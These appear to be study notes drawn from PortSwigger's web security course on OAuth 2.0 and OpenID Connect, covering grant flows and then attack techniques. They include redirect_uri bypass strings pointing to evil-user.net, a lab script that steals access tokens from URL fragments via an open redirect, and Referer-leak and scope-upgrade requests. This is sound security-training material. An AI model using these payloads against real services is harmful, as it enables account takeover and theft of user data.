
![](oauth.jpg)

- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/oauth/openid
- https://portswigger.net/research/hidden-oauth-attack-vectors
- https://portswigger.net/web-security/cors#errors-parsing-origin-headers
- https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses
- https://portswigger.net/web-security/file-path-traversal
- https://portswigger.net/web-security/cross-site-scripting/content-security-policy

OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application. This means users can fine-tune which data they want to share rather than having to hand over full control of their account to a third party. The basic OAuth process is widely used to integrate third-party functionality that requires access to certain data from a user's account. For example, an application might use OAuth to request access to your email contacts list so that it can suggest people to connect with. However, the same mechanism is also used to provide third-party authentication services, allowing users to log in with an account that they have with a different website.

**Note** Although OAuth 2.0 is the current standard, some websites still use the legacy version 1a. OAuth 2.0 was written from scratch rather than being developed directly from OAuth 1.0. As a result, the two are very different. Please be aware that the term "OAuth" refers exclusively to OAuth 2.0 throughout these materials.

## How does OAuth 2.0 work?
OAuth 2.0 was originally developed as a way of sharing access to specific data between applications. It works by defining a series of interactions between three distinct parties, namely a client application, a resource owner, and the OAuth service provider.

- **Client application** - The website or web application that wants to access the user's data.
- **Resource owner** - The user whose data the client application wants to access.
- **OAuth service provider** - The website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and a resource server.

There are numerous different ways that the actual OAuth process can be implemented. These are known as OAuth "flows" or "grant types". In this topic, we'll focus on the "authorization code" and "implicit" grant types as these are by far the most common. Broadly speaking, both of these grant types involve the following stages:

1.  The client application requests access to a subset of the user's data, specifying which grant type they want to use and what kind of access they want.
2.  The user is prompted to log in to the OAuth service and explicitly give their consent for the requested access.
3.  The client application receives a unique access token that proves they have permission from the user to access the requested data. Exactly how this happens varies significantly depending on the grant type.
4.  The client application uses this access token to make API calls fetching the relevant data from the resource server.

## What is an OAuth grant type?
The OAuth grant type determines the exact sequence of steps that are involved in the OAuth process. The grant type also affects how the client application communicates with the OAuth service at each stage, including how the access token itself is sent. For this reason, grant types are often referred to as "**OAuth flows**".

An OAuth service must be configured to support a particular grant type before a client application can initiate the corresponding flow. The client application specifies which grant type it wants to use in the initial authorization request it sends to the OAuth service.

There are several different grant types, each with varying levels of complexity and security considerations. We'll focus on the "authorization code" and "implicit" grant types as these are by far the most common.

## OAuth scopes

For any OAuth grant type, the client application has to specify which data it wants to access and what kind of operations it wants to perform. It does this using the `scope` parameter of the authorization request it sends to the OAuth service.

For basic OAuth, the scopes for which a client application can request access are unique to each OAuth service. As the name of the scope is just an arbitrary text string, the format can vary dramatically between providers. Some even use a full URI as the scope name, similar to a REST API endpoint. For example, when requesting read access to a user's contact list, the scope name might take any of the following forms depending on the OAuth service being used:

```
scope=contacts 
scope=contacts.read 
scope=contact-list-r 
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

When OAuth is used for authentication, however, the standardized OpenID Connect scopes are often used instead. For example, the scope `openid profile` will grant the client application read access to a predefined set of basic information about the user, such as their email address, username, and so on.

## Authorization code grant type
The authorization code grant type initially looks quite complicated, but it's actually simpler than you think once you're familiar with a few basics.

In short, the client application and OAuth service first use redirects to exchange a series of browser-based HTTP requests that initiate the flow. The user is asked whether they consent to the requested access. If they accept, the client application is granted an "authorization code". The client application then exchanges this code with the OAuth service to receive an "access token", which they can use to make API calls to fetch the relevant user data.

All communication that takes place from the code/token exchange onward is sent server-to-server over a secure, preconfigured back-channel and is, therefore, invisible to the end user. This secure channel is established when the client application first registers with the OAuth service. At this time, a `client_secret` is also generated, which the client application must use to authenticate itself when sending these server-to-server requests.

As the most sensitive data (the access token and user data) is not sent via the browser, this grant type is arguably the most secure. Server-side applications should ideally always use this grant type if possible.

![](oauth-authorization-code-flow.jpg)

#### 1. Authorization request
The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data. Note that the endpoint mapping may vary between providers. However, you should always be able to identify the endpoint based on the parameters used in the request.

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: oauth-authorization-server.com
```

-   `client_id`
    Mandatory parameter containing the unique identifier of the client application. This value is generated when the client application registers with the OAuth service.
-   `redirect_uri`
    The URI to which the user's browser should be redirected when sending the authorization code to the client application. This is also known as the "callback URI" or "callback endpoint". Many OAuth attacks are based on exploiting flaws in the validation of this parameter.
-   `response_type`
    Determines which kind of response the client application is expecting and, therefore, which flow it wants to initiate. For the authorization code grant type, the value should be `code`.
-   `scope`
    Used to specify which subset of the user's data the client application wants to access. Note that these may be custom scopes set by the OAuth provider or standardized scopes defined by the OpenID Connect specification. We'll cover [OpenID Connect](https://portswigger.net/web-security/oauth/openid) in more detail later.
-   `state`
    Stores a unique, unguessable value that is tied to the current session on the client application. The OAuth service should return this exact value in the response, along with the authorization code. This parameter serves as a form of [CSRF](https://portswigger.net/web-security/csrf) token for the client application by making sure that the request to its `/callback` endpoint is from the same person who initiated the OAuth flow.

#### 2. User login and consent
When the authorization server receives the initial request, it will redirect the user to a login page, where they will be prompted to log in to their account with the OAuth provider. For example, this is often their social media account.

They will then be presented with a list of data that the client application wants to access. This is based on the scopes defined in the authorization request. The user can choose whether or not to consent to this access.

It is important to note that once the user has approved a given scope for a client application, this step will be completed automatically as long as the user still has a valid session with the OAuth service. In other words, the first time the user selects "Log in with social media", they will need to manually log in and give their consent, but if they revisit the client application later, they will often be able to log back in with a single click.

#### 3. Authorization code grant
If the user consents to the requested access, their browser will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting `GET` request will contain the authorization code as a query parameter. Depending on the configuration, it may also send the `state` parameter with the same value as in the authorization request.

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

#### 4. Access token request
Once the client application receives the authorization code, it needs to exchange it for an access token. To do this, it sends a server-to-server `POST` request to the OAuth service's `/token` endpoint. All communication from this point on takes place in a secure back-channel and, therefore, cannot usually be observed or controlled by an attacker.

```http
POST /token HTTP/1.1 
Host: oauth-authorization-server.com … client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```
In addition to the `client_id` and authorization `code`, you will notice the following new parameters:

-   `client_secret`
    The client application must authenticate itself by including the secret key that it was assigned when registering with the OAuth service.
-   `grant_type`
    Used to make sure the new endpoint knows which grant type the client application wants to use. In this case, this should be set to `authorization_code`

#### 5. Access token grant
The OAuth service will validate the access token request. If everything is as expected, the server responds by granting the client application an access token with the requested scope.

```json
{ 
	"access_token": "z0y9x8w7v6u5", 
	"token_type": "Bearer", 
	"expires_in": 3600, "scope": 
	"openid profile", 
	… 
}
```

#### 6. API call
Now the client application has the access code, it can finally fetch the user's data from the resource server. To do this, it makes an API call to the OAuth service's `/userinfo` endpoint. The access token is submitted in the `Authorization: Bearer` header to prove that the client application has permission to access this data.

```http
GET /userinfo HTTP/1.1 
Host: oauth-resource-server.com Authorization: Bearer z0y9x8w7v6u5
```

#### 7. Resource grant
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope of the access token.

```json
{ "username":"carlos", "email":"carlos@carlos-montoya.net", … }
```

The client application can finally use this data for its intended purpose. In the case of OAuth authentication, it will typically be used as an ID to grant the user an authenticated session, effectively logging them in.

## Implicit grant type
The implicit grant type is much simpler. Rather than first obtaining an authorization code and then exchanging it for an access token, the client application receives the access token immediately after the user gives their consent.

You may be wondering why client applications don't always use the implicit grant type. The answer is relatively simple - it is far less secure. When using the implicit grant type, all communication happens via browser redirects - there is no secure back-channel like in the authorization code flow. This means that the sensitive access token and the user's data are more exposed to potential attacks.

The implicit grant type is more suited to single-page applications and native desktop applications, which cannot easily store the `client_secret` on the back-end, and therefore, don't benefit as much from using the authorization code grant type.

![](oauth-implicit-flow.jpg)

#### 1. Authorization request
The implicit flow starts in much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to `token`

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
```

#### 2. User login and consent
The user logs in and decides whether to consent to the requested permissions or not. This process is exactly the same as for the authorization code flow.

#### 3. Access token grant
If the user gives their consent to the requested access, this is where things start to differ. The OAuth service will redirect the user's browser to the `redirect_uri` specified in the authorization request. However, instead of sending a query parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.

```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 
Host: client-app.com
```

As the access token is sent in a URL fragment, it is never sent directly to the client application. Instead, the client application must use a suitable script to extract the fragment and store it.

#### 4. API call
Once the client application has successfully extracted the access token from the URL fragment, it can use it to make API calls to the OAuth service's `/userinfo` endpoint. Unlike in the authorization code flow, this also happens via the browser.

```http
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com 
Authorization: Bearer z0y9x8w7v6u5
```

#### 5. Resource grant
The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource i.e. the user's data based on the scope associated with the access token.

```json
{ "username":"carlos", "email":"carlos@carlos-montoya.net" }
```

The client application can finally use this data for its intended purpose. In the case of OAuth authentication, it will typically be used as an ID to grant the user an authenticated session, effectively logging them in.

### OAuth authentication
Although not originally intended for this purpose, OAuth has evolved into a means of authenticating users as well. For example, you're probably familiar with the option many websites provide to log in using your existing social media account rather than having to register with the website in question. Whenever you see this option, there's a good chance it is built on OAuth 2.0.

For OAuth authentication mechanisms, the basic OAuth flows remain largely the same; the main difference is how the client application uses the data that it receives. From an end-user perspective, the result of OAuth authentication is something that broadly resembles SAML-based single sign-on (SSO). In these materials, we'll focus exclusively on vulnerabilities in this SSO-like use case.

OAuth authentication is generally implemented as follows:
1.  The user chooses the option to log in with their social media account. The client application then uses the social media site's OAuth service to request access to some data that it can use to identify the user. This could be the email address that is registered with their account, for example.
2.  After receiving an access token, the client application requests this data from the resource server, typically from a dedicated `/userinfo` endpoint.
3.  Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password.

You can see a simple example of how this looks in the following lab. Just complete the "Log in with social media" option while proxying traffic through Burp, then study the series of OAuth interactions in the proxy history. You can log in using the credentials `wiener:peter`. Note that this implementation is deliberately vulnerable - we'll teach you how to exploit this later.

## How do oAuth authentication vulnerabilities arise?
OAuth authentication vulnerabilities arise partly because the OAuth specification is relatively vague and flexible by design. Although there are a handful of mandatory components required for the basic functionality of each grant type, the vast majority of the implementation is completely optional. This includes many configuration settings that are necessary for keeping users' data secure. In short, there's plenty of opportunity for bad practice to creep in.

One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation. As you've probably gathered, there's a lot to take in and this is quite easy to get wrong if you're inexperienced with OAuth.

Depending on the grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it.

## Identifying OAuth authentication
Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.

The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. 

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## Recon
Doing some basic recon of the OAuth service being used can point you in the right direction when it comes to identifying vulnerabilities.

It goes without saying that you should study the various HTTP interactions that make up the OAuth flow - we'll go over some specific things to look out for later. If an external OAuth service is used, you should be able to identify the specific provider from the hostname to which the authorization request is sent. As these services provide a public API, there is often detailed documentation available that should tell you all kinds of useful information, such as the exact names of the endpoints and which configuration options are being used.

Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following standard endpoints:
-   `/.well-known/oauth-authorization-server`
-   `/.well-known/openid-configuration`

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation.

## Exploiting OAuth authentication vulnerabilities
Vulnerabilities can arise in the client application's implementation of OAuth as well as in the configuration of the OAuth service itself. In this section, we'll show you how to exploit some of the most common vulnerabilities in both of these contexts.

### Vulnerabilities in the OAuth client application
Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.

As we've already mentioned, the OAuth specification is relatively loosely defined. This is especially true with regard to the implementation by the client application. There are a lot of moving parts in an OAuth flow, with many optional parameters and configuration settings in each grant type, which means there's plenty of scope for misconfigurations.

#### Improper implementation of the implicit grant type
Due to the dangers introduced by sending access tokens via the browser, the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type) is mainly recommended for single-page applications. However, it is also often used in classic client-server web applications because of its relative simplicity.

In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.

To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.

In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply change the parameters sent to the server to impersonate any user.

#### Flawed CSRF protection
Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Therefore, if you notice that the authorization request does not send a `state` parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional [CSRF attack](https://portswigger.net/web-security/csrf). This can have severe consequences depending on how OAuth is being used by the client application.

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the `state` parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

Note that if the site allows users to log in exclusively via OAuth, the `state` parameter is arguably less critical. However, not using a `state` parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.

### Leaking authorization codes and access tokens
Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

More secure authorization servers will require a `redirect_uri` parameter to be sent when exchanging the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second `redirect_uri` parameter.

#### Flawed redirect_uri validation
Due to the kinds of attacks seen in the previous lab, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the `redirect_uri` parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example:

-   Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
-   If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`

If you're not familiar with these techniques, we recommend reading our content on how to [circumvent common SSRF defences](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses) and [CORS](https://portswigger.net/web-security/cors#errors-parsing-origin-headers).
- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows: `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.

It is important to note that you shouldn't limit your testing to just probing the `redirect_uri` parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

#### Stealing codes and access tokens via a proxy page
Against more robust targets, you might find that no matter what you try, you are unable to successfully submit an external domain as the `redirect_uri`. However, that doesn't mean it's time to give up.

By this stage, you should have a relatively good understanding of which parts of the URI you can tamper with. The key now is to use this knowledge to try and access a wider attack surface within the client application itself. In other words, try to work out whether you can change the `redirect_uri` parameter to point to any other pages on a whitelisted domain.

Try to find ways that you can successfully access different subdomains or paths. For example, the default URI will often be on an OAuth-specific path, such as `/oauth/callback`, which is unlikely to have any interesting subdirectories. However, you may be able to use [directory traversal](https://portswigger.net/web-security/file-path-traversal) tricks to supply any arbitrary path on the domain. Something like this:

```http
https://client-app.com/oauth/callback/../../example/path
```

May be interpreted on the back-end as:

```http
https://client-app.com/example/path
```

Once you identify which other pages you are able to set as the redirect URI, you should audit them for additional vulnerabilities that you can potentially use to leak the code or token. For the [authorization code flow](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), you need to find a vulnerability that gives you access to the query parameters, whereas for the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), you need to extract the URL fragment.

One of the most useful vulnerabilities for this purpose is an open redirect. You can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where you can host any malicious script you like.

Note that for the implicit grant type, stealing an access token doesn't just enable you to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, you can also use the token to make your own API calls to the OAuth service's resource server. This may enable you to fetch sensitive user data that you cannot normally access from the client application's web UI.

Script to extract the token from the fragment (#)
```js
<script> 
if (!document.location.hash) 
{ 
	window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' 
} 
else { window.location = '/?'+document.location.hash.substr(1) }
</script>
```

In addition to open redirects, you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain. Some good examples include:
- **Dangerous JavaScript that handles query parameters and URL fragments**  
    For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.
- **XSS vulnerabilities**  
    Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the `HTTPOnly` attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.
- **HTML injection vulnerabilities**  
    In cases where you cannot inject JavaScript (for example, due to [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.

### Flawed scope validation
In any OAuth flow, the user must approve the requested access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.

#### Scope upgrade: authorization code flow
With the [authorization code grant type](https://portswigger.net/web-security/oauth/grant-types#authorization-code-grant-type), the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly. However, it may still be possible to achieve the same result by registering their own client application with the OAuth service.

For example, let's say the attacker's malicious client application initially requested access to the user's email address using the `openid email` scope. After the user approves this request, the malicious client application receives an authorization code. As the attacker controls their client application, they can add another `scope` parameter to the code/token exchange request containing the additional `profile` scope:

```http
POST /token 
Host: oauth-authorization-server.com 
… 
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```

If the server does not validate this against the scope from the initial authorization request, it will sometimes generate an access token using the new scope and send this to the attacker's client application:

```json
{ 
	"access_token": "z0y9x8w7v6u5", 
	"token_type": "Bearer", 
	"expires_in": 3600, 
	"scope": "openid email profile",
	…
}
```

The attacker can then use their application to make the necessary API calls to access the user's profile data.

#### Scope upgrade: implicit flow
For the [implicit grant type](https://portswigger.net/web-security/oauth/grant-types#implicit-grant-type), the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's `/userinfo` endpoint, manually adding a new `scope` parameter in the process.

Ideally, the OAuth service should validate this `scope` value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user.

### Unverified user registration
When authenticating users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.

Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider.

## Extending OAuth with OpenID Connect
When used for authentication, OAuth is often extended with an OpenID Connect layer, which provides some additional features related to identifying and authenticating users. For a detailed description of these features, and some more labs related to vulnerabilities that they can introduce, see our OpenID Connect topic.

## What is OpenID Connect?
OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the [basic OAuth implementation](https://portswigger.net/web-security/oauth#how-does-oauth-2-0-work). It adds some simple functionality that enables better support for the authentication use case of OAuth.

## How does OpenID Connect work?
OpenID Connect slots neatly into the normal [OAuth flows](https://portswigger.net/web-security/oauth/grant-types). From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: `id_token`

### OpenID Connect roles
The roles for OpenID Connect are essentially the same as for standard OAuth. The main difference is that the specification uses slightly different terminology.
- **Relying party** - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
- **End user** - The user who is being authenticated. This is synonymous with the OAuth resource owner.
-  **OpenID provider** - An OAuth service that is configured to support OpenID Connect.

### OpenID Connect claims and scopes
The term "claims" refers to the `key:value` pairs that represent information about the user on the resource server. One example of a claim could be `"family_name":"Montoya"`

Unlike basic OAuth, whose [scopes are unique to each provider](https://portswigger.net/web-security/oauth/grant-types#oauth-scopes), all OpenID Connect services use an identical set of scopes. In order to use OpenID Connect, the client application must specify the scope `openid` in the authorization request. They can then include one or more of the other standard scopes:
-   `profile`
-   `email`
-   `address`
-   `phone`

Each of these scopes corresponds to read access for a subset of claims about the user that are defined in the OpenID specification. For example, requesting the scope `openid profile` will grant the client application read access to a series of claims related to the user's identity, such as `family_name`, `given_name`, `birth_date`, and so on.

### ID token
The other main addition provided by OpenID Connect is the `id_token` response type. This returns a JSON web token ([JWT](https://portswigger.net/web-security/jwt)) signed with a JSON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested. It also contains information about how and when the user was last authenticated by the OAuth service. The client application can use this to decide whether or not the user has been sufficiently authenticated.

The main benefit of using `id_token` is the reduced number of requests that need to be sent between the client application and the OAuth service, which could provide better performance overall. Instead of having to get an access token and then request the user data separately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves.

Rather than simply relying on a trusted channel, as happens in basic OAuth, the integrity of the data transmitted in an ID token is based on a JWT cryptographic signature. For this reason, the use of ID tokens may help protect against some man-in-the-middle attacks. However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on `/.well-known/jwks.json`), some attacks are still possible.

Note that multiple response types are supported by OAuth, so it's perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's `id_token` response type:

```http
response_type=id_token token 
response_type=id_token code
```

In this case, both an ID token and either a code or access token will be sent to the client application at the same time.

## Identifying OpenID Connect
If OpenID connect is actively being used by the client application, this should be obvious from the authorization request. The most foolproof way to check is to look for the mandatory `openid` scope.

Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. You can simply try adding the `openid` scope or changing the response type to `id_token` and observing whether this results in an error.

As with basic OAuth, it's also a good idea to take a look at the OAuth provider's documentation to see if there's any useful information about their OpenID Connect support. You may also be able to access the configuration file from the standard endpoint `/.well-known/openid-configuration`.

## OpenID Connect vulnerabilities
The specification for OpenID Connect is much stricter than that of basic OAuth, which means there is generally less potential for quirky implementations with glaring vulnerabilities. That said, as it is just a layer that sits on top of OAuth, the client application or OAuth service may still be vulnerable to some of the OAuth-based attacks we looked at earlier. In fact, you might have noticed that all of our [OAuth authentication labs](https://portswigger.net/web-security/all-labs#oauth-authentication) also use OpenID Connect.

In this section, we'll look at some additional vulnerabilities that may be introduced by some of the extra features of OpenID Connect.

### Unprotected dynamic client registration
The OpenID specification outlines a standardized way of allowing client applications to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a `POST` request to a dedicated `/registration` endpoint. The name of this endpoint is usually provided in the configuration file and documentation.

In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on. A typical registration request may look something like this:

```http
POST /openid/register HTTP/1.1 
Content-Type: application/json Accept: application/json 
Host: oauth-authorization-server.com 
Authorization: Bearer ab12cd34ef56gh89 

{ 
	"application_type": "web", 
	"redirect_uris": [ "https://client-app.com/callback", "https://client-app.com/callback2" 
	], 
	"client_name": "My Application", 
	"logo_uri": "https://client-app.com/logo.png",
	"token_endpoint_auth_method": "client_secret_basic", 
	"jwks_uri": "https://client-app.com/my_public_keys.jwks",
	"userinfo_encrypted_response_alg": "RSA1_5",
	"userinfo_encrypted_response_enc": "A128CBC-HS256",
	… 
}
```

The OpenID provider should require the client application to authenticate itself. In the example above, they're using an HTTP bearer token. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.

For example, you may have noticed that some of these properties can be provided as URIs. If any of these are accessed by the OpenID provider, this can potentially lead to second-order [SSRF](https://portswigger.net/web-security/ssrf) vulnerabilities unless additional security measures are in place.

### Allowing authorization requests by reference
Up to this point, we've looked at the standard way of submitting the required parameters for the authorization request i.e. via the query string. Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single `request_uri` parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this `request_uri` parameter is another potential vector for SSRF.

You might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to parameters in a JWT, including the `redirect_uri`.

To check whether this option is supported, you should look for the `request_uri_parameter_supported` option in the configuration file and documentation. Alternatively, you can just try adding the `request_uri` parameter to see if it works. You will find that some servers support this feature even if they don't explicitly mention it in their documentation